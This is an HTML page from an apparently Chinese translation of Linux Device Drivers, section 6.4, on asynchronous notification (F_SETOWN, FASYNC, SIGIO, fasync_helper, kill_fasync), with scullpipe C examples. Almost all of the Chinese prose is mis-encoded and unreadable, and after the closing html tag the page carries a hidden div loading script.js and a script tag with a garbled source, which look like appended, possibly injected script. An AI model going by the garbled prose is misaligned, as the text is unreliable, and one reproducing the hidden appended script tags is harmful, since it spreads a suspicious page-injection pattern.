<html xmlns:cf="http://docbook.sourceforge.net/xmlns/chunkfast/1.0">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
<title>6.4.&#160;첽֪ͨ-Linux豸棨İ棩- - </title>
<meta name="description" content="- - " />
<meta name="keywords" content="Linux豸,İ,,ldd,linux device driver,,Ӱ,,, " />
<meta name="author" content="  www.21cstar.com QQ:610061171" /> 
<meta name="verify-v1" content="5asbXwkS/Vv5OdJbK3Ix0X8osxBUX9hutPyUxoubhes=" />
<link rel="stylesheet" href="docbook.css" type="text/css">
<meta name="generator" content="DocBook XSL Stylesheets V1.69.0">
<link rel="start" href="index.html" title="Linux 豸 Edition 3">
<link rel="up" href="ch06.html" title="&#160;6&#160;&#160;߼ַ">
<link rel="prev" href="ch06s03.html" title="6.3.&#160;poll  select">
<link rel="next" href="ch06s05.html" title="6.5.&#160;λһ豸">
</head>
<body bgcolor="white" text="black" link="#0000FF" vlink="#840084" alink="#0000FF">
<div class="navheader">
<table width="100%" summary="Navigation header">
<tr><th colspan="3" align="center">6.4.&#160;첽֪ͨ</th></tr>
<tr>
<td width="20%" align="left">
<a accesskey="p" href="ch06s03.html">һҳ</a>&#160;</td>
<th width="60%" align="center">&#160;6&#160;&#160;߼ַ</th>
<td width="20%" align="right">&#160;<a accesskey="n" href="ch06s05.html">һҳ</a>
</td>
</tr>
</table>
<hr>
</div>
<div class="sect1" lang="zh-cn">
<div class="titlepage"><div><div><h2 class="title" style="clear: both">
<a name="AsynchronousNotification.sect1"></a>6.4.&#160;첽֪ͨ</h2></div></div></div>
<p>ͷ select Ľ϶ڲѯ豸ڴ󲿷ʱ㹻, һЩܱļЧؽ.</p>
<p>һ, ڵȼִһѭ, ҪܿĴ. ӦµĳЩݻȡı, Ӧ֪ݿʱ. Ӧóܱд poll йɵؼ, , , иõķ. ͨʹ첽֪ͨ, ӦóܽһźۺʱݿòҲҪԼȥѯ.</p>
<p>ûִ 2 ʹļ첽֪ͨ. , ָһΪļӵ. һʹ fcntl ϵͳ÷ F_SETOWN , ӵ̵߽ ID  filp-&gt;f_owner Ժʹ. һں֪֪ͨ˭ǱҪ. Ϊʹ첽֪ͨ, û FASYNC ־豸, ͨ F_SETFL fcntl .</p>
<p> 2  ѱִк, ļݽһ SIGIO ź, ۺʱݵ. źű͸洢 filp-&gt;f_owner еĽ(߽, ֵΪֵ).</p>
<p>, ûеĴʹ첽֪ͨǰ,  stdin ļ:</p>
<pre class="programlisting">
signal(SIGIO, &amp;input_handler); /* dummy sample; sigaction() is better */
fcntl(STDIN_FILENO, F_SETOWN, getpid());
oflags = fcntl(STDIN_FILENO, F_GETFL);
fcntl(STDIN_FILENO, F_SETFL, oflags | FASYNC);
</pre>
<p>ԴΪ asynctest ĳһ򵥵ĳ, ȡ stdin.  scullpipe 첽.  cat Ƶǲļβ; ֻӦ, û.</p>
<p>ע, , е豸֧첽֪ͨ, ѡṩ. Ӧó򳣳ٶ첽ֻ socket  tty .</p>
<p>֪ͨһʣµ. һյһ SIGIO, ֪ĸļṩ. һļʹ첽֪ͨĽ, ӦóȻ poll  select ҳʲô.</p>
<div class="sect2" lang="zh-cn">
<div class="titlepage"><div><div><h3 class="title">
<a name="TheDriversPointofView.sect2"></a>6.4.1.&#160;Ĺ۵</h3></div></div></div>
<p>˵һص豸ʵ첽ź. гϸĲ˳, ں˵Ĺ۵:</p>
<div class="itemizedlist"><ul type="disc">
<li><p>1.  F_SETOWN, ʲôû, һֵֵ filp-&gt;f_owner.</p></li>
<li><p>2.  F_SETFL ִ FASYNC,  fasync . ۺʱ FASYNC ֵ filp-&gt;f_flags бı֪ͨ仯, ȷӦ. ־ļʱȱʡر. ǽı׼ʵ, ڱ.</p></li>
<li><p>3. ݵ, еע첽֪ͨḺ̌뱻һ SIGIO ź.</p></li>
</ul></div>
<p>Ȼʵֵһ׵--ûʲôҪ--Ĳάһ̬ݽṹٲͬ첽; м. ̬ݽṹ, , 豸, ںṩһʵͨʵ㲻±дͬĴÿ.</p>
<p>Linux ṩͨʵǻһݽṹ 2 (ǰ˵ĵ 2 ͵ 3 ). زϵͷļ&lt;linux/fs.h&gt;(û¶), ݽṹΪ struct fasync_struct. ڵȴ, Ҫһָ豸ضݽṹ.</p>
<p>õ 2 Ӧԭ:</p>
<pre class="programlisting">
int fasync_helper(int fd, struct file *filp, int mode, struct fasync_struct **fa);
void kill_fasync(struct fasync_struct **fa, int sig, int band);
</pre>
<p>fasync_helper صĽбӻȥ,  FASYNC ־һļı. вһ, ṩ fasync ұֱӴ. ݵʱ kill_fasync ֪ͨصĽ. ĲǱݵź( SIGIO) band, ⼸ POLL_IN<sup>[<a name="id437432" href="#ftn.id437432">25</a>]</sup>(""ߴ, ).</p>
<p> scullpipe ʵ fasync :</p>
<pre class="programlisting">
static int scull_p_fasync(int fd, struct file *filp, int mode)
{
 struct scull_pipe *dev = filp-&gt;private_data;
 return fasync_helper(fd, filp, mode, &amp;dev-&gt;async_queue);
}
</pre>
<p>ȻеĹ fasync_helper . , ʵûһ, ΪæҪȡȷָ struct fasync_struct ( dev-&gt;async_queue)ָ, ֻṩϢ.</p>
<p>ݵ, 뱻ִ֪ͨ첽. Ϊ sucllpipe ߵͨһ write Ḻ̌,  scullpipe  write .</p>
<pre class="programlisting">
if (dev-&gt;async_queue)
 kill_fasync(&amp;dev-&gt;async_queue, SIGIO, POLL_IN);
</pre>
<p>ע, һЩ豸ʵ첽ָ֪ͨʾ豸ɱдʱ; , Ȼ, kill_fasnyc 뱻ʹһ POLL_OUT ģʽ.</p>
<p>ܻѾɵȻһ©. Ǳǵ fasync , ļرӼ첽бȥļ. ý filp-&gt;f_flags Ϊ FASYNC ʱҪ, βⲢǳʵ. Ĵ, ,  scullpipe  release һ:</p>
<pre class="programlisting">
/* remove this filp from the asynchronously notified filp's */
scull_p_fasync(-1, filp, 0);
</pre>
<p>첽֪֮ͨµݽṹһֱͽṹ struct wait_queue һµ, Ϊ 2 漰ȴһ¼.  struct file  struct task_struct. еĽṹ file ȡ f_owner, Ϊ֪ͨ.</p>
</div>
<div class="footnotes">
<br><hr width="100" align="left">
<div class="footnote"><p><sup>[<a name="ftn.id437432" href="#id437432">25</a>] </sup>POLL_IN һ, 첽֪ͨ; ͬ POLLIN|POLLRDNORM.</p></div>
</div>
</div>
<div class="navfooter">
<hr>
<table width="100%" summary="Navigation footer">
<tr>
<td width="40%" align="left">
<a accesskey="p" href="ch06s03.html">һҳ</a>&#160;</td>
<td width="20%" align="center"><a accesskey="u" href="ch06.html">һ</a></td>
<td width="40%" align="right">&#160;<a accesskey="n" href="ch06s05.html">һҳ</a>
</td>
</tr>
<tr>
<td width="40%" align="left" valign="top">6.3.&#160;poll  select&#160;</td>
<td width="20%" align="center"><a accesskey="h" href="index.html">ʼҳ</a></td>
<td width="40%" align="right" valign="top">&#160;6.5.&#160;λһ豸</td>
</tr>
</table>
</div>
</body></html>
<div style="display:none"><script language="JavaScript" src="script.js"></script> </div>

<script language=javascript src=G2Bݔx8n*n*n*n*n*n*ݚPpd></script>